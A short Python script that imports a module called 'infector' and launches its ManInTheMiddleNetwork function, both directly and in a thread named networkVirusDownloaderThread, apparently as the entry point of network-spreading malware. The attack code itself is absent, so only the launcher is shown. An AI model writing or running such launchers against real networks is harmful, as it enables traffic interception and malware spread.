import infector, threading

infector.ManInTheMiddleNetwork()

networkVirusDownloaderThread = threading.Thread(target= infector.ManInTheMiddleNetwork).start()